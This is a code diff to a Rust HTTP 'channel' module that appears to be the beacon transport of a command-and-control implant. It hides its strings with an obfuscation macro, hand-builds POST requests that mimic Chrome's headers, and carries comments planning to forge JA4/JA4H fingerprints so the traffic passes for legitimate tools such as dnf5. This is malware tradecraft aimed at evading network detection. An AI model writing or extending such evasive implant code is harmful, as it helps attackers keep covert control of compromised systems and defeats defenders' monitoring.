@@ -5,9 +5,10 @@ use super::{Channel, ChannelInfo, Latency, SendContext};
 use core::net::SocketAddr;
 use core::net::Ipv4Addr;
 use crate::dns;
-use crate::strings;
 use crate::sys;
 use crate::errors::ChannelError;
+use glimmer_obfstr::obfs;
+
 
 pub struct HTTPChannel {
     endpoints: Vec<String>,
@@ -41,12 +42,10 @@ impl HTTPChannel {
     }
 
     fn parse_host_port(endpoint: &str) -> (&str, u16) {
-        let https_scheme = strings::decode_str(strings::HTTPS_SCHEME);
-        let http_scheme = strings::decode_str(strings::HTTP_SCHEME);
 
         let without_scheme = endpoint
-            .strip_prefix(&https_scheme)
-            .or_else(|| endpoint.strip_prefix(&http_scheme))
+            .strip_prefix(obfs!("https://").as_str())
+            .or_else(|| endpoint.strip_prefix(obfs!("http://").as_str()))
             .unwrap_or(endpoint);
 
         if let Some(pos) = without_scheme.rfind(':') {
@@ -58,7 +57,7 @@ impl HTTPChannel {
             (host, port)
         } else {
             let host = without_scheme.trim_end_matches('/');
-            if endpoint.starts_with(&https_scheme) {
+            if endpoint.starts_with(obfs!("https://").as_str()) {
                 (host, 443)
             } else {
                 (host, 80)
@@ -140,29 +139,30 @@ impl Channel for HTTPChannel {
         // Set read timeout
         let _ = sys::set_read_timeout(fd, 30);
 
-        // Build request from XOR-encoded strings
-        let mut req = Vec::with_capacity(512 + body.len());
-        req.extend_from_slice(&strings::decode(strings::POST_LINE));
-        req.extend_from_slice(&strings::decode(strings::HOST_PREFIX));
+        // will pull from a list of agents later based on call-site, and work on making sure JA4 and JA4H fingerprints align with each other and make sense with callsite
+        // e.g. if callsite is mimicking dnf5 we need a JA4 and JA4H fingerprint that match dnf5 not just each other
+        // the JA4H work is pretty straightforward just need to capture some real requests, making it match callsites is pretty straightforward, need functionality for matching JA4 fingerprints and also to capture some
+        let mut req = Vec::new();
+        req.extend_from_slice(obfs!("POST / HTTP/1.1\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Host: ").as_bytes());
         req.extend_from_slice(host.as_bytes());
-        req.extend_from_slice(&strings::decode(strings::CRLF));
-
-        // Standard browser headers in typical order
-        req.extend_from_slice(b"User-Agent: ");
-        req.extend_from_slice(&strings::decode(strings::USER_AGENT));
-        req.extend_from_slice(&strings::decode(strings::CRLF));
-        req.extend_from_slice(&strings::decode(strings::ACCEPT_HEADER));
-        req.extend_from_slice(&strings::decode(strings::ACCEPT_LANG));
-        req.extend_from_slice(&strings::decode(strings::ACCEPT_ENC));
-        req.extend_from_slice(&strings::decode(strings::CONTENT_TYPE_HEADER));
-        req.extend_from_slice(&strings::decode(strings::CONTENT_LENGTH));
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
+        req.extend_from_slice(obfs!("User-Agent: ").as_bytes());
+        req.extend_from_slice(
+            obfs!("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36").as_bytes()
+        );
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Accept-Language: en-US,en;q=0.5\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Accept-Encoding: gzip, deflate\r\n").as_bytes());
+        req.extend_from_slice(
+            obfs!("Content-Type: application/x-www-form-urlencoded\r\n").as_bytes(),
+        );
+        req.extend_from_slice(obfs!("Content-Length: ").as_bytes());
         req.extend_from_slice(body.len().to_string().as_bytes());
-        req.extend_from_slice(&strings::decode(strings::CRLF));
-        req.extend_from_slice(&strings::decode(strings::COOKIE_PREFIX));
-        req.extend_from_slice(ctx.node_id.as_bytes());
-        req.extend_from_slice(&strings::decode(strings::CRLF));
-        req.extend_from_slice(&strings::decode(strings::CONNECTION_CLOSE));
-        req.extend_from_slice(&strings::decode(strings::CRLF));
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
+        req.extend_from_slice(obfs!("Connection: keep-alive\r\n").as_bytes());
+        req.extend_from_slice(obfs!("\r\n").as_bytes());
         req.extend_from_slice(body.as_bytes());
 
         // Write via syscall
